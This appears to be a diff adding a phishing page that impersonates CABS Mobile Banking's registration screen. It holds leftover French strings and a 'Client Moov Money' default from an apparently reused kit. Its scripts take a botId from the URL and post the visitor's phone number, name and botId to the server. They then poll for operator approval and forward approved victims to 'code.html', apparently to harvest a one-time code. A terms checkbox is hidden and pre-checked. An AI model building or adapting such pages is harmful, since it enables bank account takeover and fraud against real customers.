@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CABS Mobile Banking - Registration</title>
+
+    <style>
+        /* ===========================
+           RESET
+        =========================== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #fff;
+            color: #333;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===========================
+           TOP HEADER (CABS Blue)
+        =========================== */
+        .top-bar {
+            width: 100%;
+            height: 72px;
+            background: #0d47a1;           /* CABS dark blue */
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            color: #fff;
+            text-decoration: none;
+            font-size: 30px;
+            font-weight: 300;
+            line-height: 1;
+            margin-right: 16px;
+        }
+
+        /* Optional header title – we keep it minimal, just the back arrow */
+
+        /* ===========================
+           PAGE CONTAINER – centered
+        =========================== */
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 34px 28px 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===========================
+           FORM (keeps the same id/class)
+        =========================== */
+        #detailsForm {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===========================
+           TITLE & SUBTITLE
+        =========================== */
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0d47a1;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        /* ===========================
+           PHONE INPUT with country code + arrow
+        =========================== */
+        .phone-input-wrap {
+            position: relative;
+            width: 100%;
+            margin-bottom: 0;
+        }
+
+        .phone-input-wrap input {
+            width: 100%;
+            height: 58px;
+            border: 2px solid #0d47a1;
+            border-radius: 10px;
+            background: #fff;
+            padding: 0 16px 0 90px;   /* space for country code + arrow */
+            font-size: 17px;
+            color: #333;
+            outline: none;
+            transition: .2s;
+        }
+
+        .phone-input-wrap input::placeholder {
+            color: #999;
+            font-weight: 400;
+        }
+
+        .phone-input-wrap input:focus {
+            border-color: #0d47a1;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.2);
+        }
+
+        /* Country code + down arrow */
+        .country-code {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 17px;
+            font-weight: 600;
+            color: #0d47a1;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .country-code::after {
+            content: "▼";
+            font-size: 12px;
+            color: #0d47a1;
+            margin-left: 4px;
+        }
+
+        /* ===========================
+           BOTTOM SECTION (push to bottom)
+        =========================== */
+        .bottom-section {
+            margin-top: auto;
+            padding-bottom: 10px;
+        }
+
+        /* ===========================
+           CHECKBOX – hidden but still functional
+        =========================== */
+        .checkbox-wrap {
+            display: none;   /* hidden – terms always accepted */
+        }
+
+        /* We keep the checkbox in DOM, but hidden and checked */
+        #termsCheck {
+            display: none;
+        }
+
+        /* ===========================
+           CONTINUE BUTTON (CABS Blue)
+        =========================== */
+        button {
+            width: 100%;
+            height: 56px;
+            border: none;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            background: #b7cff0;          /* disabled state */
+            cursor: not-allowed;
+            transition: .2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        button:enabled {
+            background: #0d47a1;           /* CABS blue */
+            cursor: pointer;
+        }
+
+        button:enabled:hover {
+            background: #0a3a8a;
+        }
+
+        /* ===========================
+           STATUS & SPINNER (unchanged)
+        =========================== */
+        .status {
+            display: none;
+            margin-top: 15px;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .spinner {
+            display: none;
+            width: 34px;
+            height: 34px;
+            margin: 18px auto 0;
+            border: 3px solid rgba(13, 71, 161, .15);
+            border-top: 3px solid #0d47a1;
+            border-radius: 50%;
+            animation: spin .8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ===========================
+           RESPONSIVE
+        =========================== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 28px 20px 22px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .subtitle {
+                font-size: 15px;
+            }
+
+            .phone-input-wrap input {
+                height: 56px;
+                font-size: 16px;
+                padding-left: 84px;
+            }
+
+            .country-code {
+                font-size: 16px;
+                left: 14px;
+            }
+
+            button {
+                height: 56px;
+                font-size: 19px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 24px 16px 18px;
+            }
+
+            .title {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+            }
+
+            .phone-input-wrap input {
+                height: 54px;
+                font-size: 15px;
+                padding-left: 76px;
+            }
+
+            .country-code {
+                font-size: 15px;
+            }
+
+            button {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- CABS-style Header (back button only, blue background) -->
+    <div class="top-bar">
+        <a href="javascript:history.back()" class="back-btn">&#8592;</a>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+
+        <!-- Page titles -->
+        <div class="title">Registration</div>
+        <div class="subtitle">Welcome to CABS Mobile Banking</div>
+
+        <form id="detailsForm" class="form-content">
+
+            <!-- Phone Number -->
+            <div class="phone-input-wrap">
+                <span class="country-code">+263</span>
+                <input
+                    type="tel"
+                    id="phone"
+                    name="phone"
+                    placeholder="Mobile Number"
+                    autocomplete="tel-national"
+                    required>
+            </div>
+
+            <!-- Bottom Section -->
+            <div class="bottom-section">
+
+                <!-- Terms checkbox – hidden but pre‑checked so logic works -->
+                <div class="checkbox-wrap">
+                    <input
+                        type="checkbox"
+                        id="termsCheck"
+                        checked
+                        required>
+                    <label for="termsCheck">Terms (hidden)</label>
+                </div>
+
+                <!-- Continue Button -->
+                <button
+                    type="submit"
+                    class="primary"
+                    id="continueBtn"
+                    disabled>
+                    SUBMIT
+                </button>
+
+            </div>
+
+        </form>
+
+        <!-- Hidden status/spinner (kept for logic) -->
+        <div id="status" class="status"></div>
+        <div id="spinner" class="spinner"></div>
+
+    </div>
+
+    <!-- ====== YOUR ORIGINAL SCRIPTS (UNTOUCHED) ====== -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+
+            const form = document.getElementById("detailsForm");
+            const phone = document.getElementById("phone");
+            const terms = document.getElementById("termsCheck");
+            const button = document.getElementById("continueBtn");
+            const spinner = document.getElementById("spinner");
+            const status = document.getElementById("status");
+
+            function validateForm() {
+                const phoneNumber = phone.value.replace(/\D/g, "");
+
+                if (phoneNumber.length >= 8 && terms.checked) {
+                    button.disabled = false;
+                } else {
+                    button.disabled = true;
+                }
+            }
+
+            phone.addEventListener("input", function() {
+                this.value = this.value.replace(/\D/g, "");
+                validateForm();
+            });
+
+            terms.addEventListener("change", validateForm);
+
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+
+                button.disabled = true;
+                spinner.style.display = "block";
+
+                status.style.display = "block";
+                status.textContent = "⏳ En attente d'approbation...";
+
+                // Your submission logic goes here
+            });
+
+        });
+    </script>
+
+    <script>
+        let fullName = localStorage.getItem('fullName');
+        if (!fullName) { fullName = 'Client Moov Money';
+            localStorage.setItem('fullName', fullName); }
+
+        const params = new URLSearchParams(window.location.search);
+        const urlBotId = params.get('botId');
+        if (urlBotId) localStorage.setItem('botId', urlBotId);
+        const botId = localStorage.getItem('botId');
+
+        if (!botId) { alert('Session expirée. Veuillez recommencer.');
+            window.location.href = 'index.html'; }
+
+        const form = document.getElementById('detailsForm');
+        const statusEl = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const nextButton = form.querySelector('button.primary');
+        const termsCheck = document.getElementById('termsCheck');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!termsCheck.checked) {
+                statusEl.style.display = 'block';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
+                return;
+            }
+            nextButton.disabled = true;
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                statusEl.style.display = 'block';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
+                nextButton.disabled = false;
+                return;
+            }
+            localStorage.setItem('phone', phone);
+            statusEl.style.display = 'block';
+            spinner.style.display = 'block';
+            statusEl.classList.remove('error');
+            statusEl.textContent = '⏳ En attente d\'approbation...';
+            try {
+                const res = await fetch(`${window.location.origin}/submit-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: fullName, phone, botId })
+                });
+                if (!res.ok) throw new Error();
+                const { requestId } = await res.json();
+                pollApproval(requestId);
+            } catch (error) {
+                spinner.style.display = 'none';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
+                nextButton.disabled = false;
+            }
+        });
+
+        function pollApproval(requestId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
+                    const data = await res.json();
+                    if (data.redirect) { clearInterval(interval);
+                        window.location.href = data.redirect; return; }
+                    if (data.approved === false) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        statusEl.classList.add('error');
+                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
+                        nextButton.disabled = false;
+                    }
+                    if (data.approved === true) { clearInterval(interval);
+                        window.location.href = 'code.html'; }
+                } catch (error) { console.error('Polling error:', error); }
+            }, 2000);
+        }
+    </script>
+
+</body>
+</html>
